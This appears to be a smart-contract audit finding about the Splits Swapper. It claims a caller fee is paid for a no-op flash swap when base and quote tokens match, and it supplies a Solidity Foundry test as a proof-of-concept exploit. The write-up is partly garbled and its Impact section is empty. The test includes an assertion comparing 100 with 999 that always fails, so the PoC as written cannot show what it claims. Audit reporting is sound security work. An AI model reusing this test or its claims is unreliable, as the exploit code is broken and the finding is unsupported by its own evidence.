GalloDaSballo

medium

# If Quote Token is on Swapper, then a fee will be paid for a no-op

## Summary

Since there's always a caller incentive for the Swapper, any time the tokenIn is the same as the tokenOut, the caller will receive a fee for a no-op

https://github.com/sherlock-audit/2023-04-splits/blob/main/splits-oracle/test/UniV3OracleImpl.t.sol#L264-L265

## Vulnerability Detail

We know the values is less than 100% so the same token can be inputed, the pool skips the existance check and that will cause a fee to be taken for a no-op

## Impact

## Code Snippet

Add to `SwapperImpl.t.sol`

```solidity
function test_scamTheSwapper() public unpaused {
        initParams.tokenToBeneficiary = mockERC20;
        vm.prank(address(swapperFactory));
        swapper.initializer(initParams);

        vm.startPrank(trader);

        mockScamERC20.push(
            OracleImpl.QuoteParams({
                quotePair: QuotePair({base: mockERC20, quote: mockERC20}),
                baseAmount: 1 ether,
                data: ""
            })
        );

        quoteParams = mockScamERC20;
        qp = quoteParams[0];
        base = qp.quotePair.base;
        quote = qp.quotePair.quote;

        traderBasePreBalance = base._balanceOf(trader);
        swapperBasePreBalance = base._balanceOf(address(swapper));
        beneficiaryBasePreBalance = base._balanceOf(beneficiary);

        traderQuotePreBalance = quote._balanceOf(trader);
        swapperQuotePreBalance = quote._balanceOf(address(swapper));
        beneficiaryQuotePreBalance = quote._balanceOf(beneficiary);

        MockERC20(mockERC20).approve(address(swapper), .98 ether);

        vm.mockCall({
            callee: trader,
            msgValue: 0,
            data: abi.encodeCall(ISwapperFlashCallback.swapperFlashCallback, (quote, 0, "")),
            returnData: ""
        });

        swapper.flash(quoteParams, "");

        uint256 based  = 100;
        uint256 value  = 999;

        assertEq(based, value, "Left is 100, right is 999");
        assertEq(base._balanceOf(trader), traderBasePreBalance + 1 ether, "Base Balance of Trader");
        assertEq(base._balanceOf(address(swapper)), swapperBasePreBalance - 1 ether, "Base Balance of Swapper");
        assertEq(base._balanceOf(beneficiary), beneficiaryBasePreBalance, "Base Balance of Beneficiary");

        assertEq(quote._balanceOf(trader), traderQuotePreBalance - 1 ether, "Quote Balance of Trader");
        assertEq(quote._balanceOf(address(swapper)), 0, "Quote Balance of Swapper");
        assertEq(quote._balanceOf(beneficiary), beneficiaryQuotePreBalance + swapperQuotePreBalance + 1 ether, "Quote Balance of Beneficiary");
    }
  ```

## Tool used

Manual Review

## Recommendation

In case of a no-op sweep directly to the beneficiary
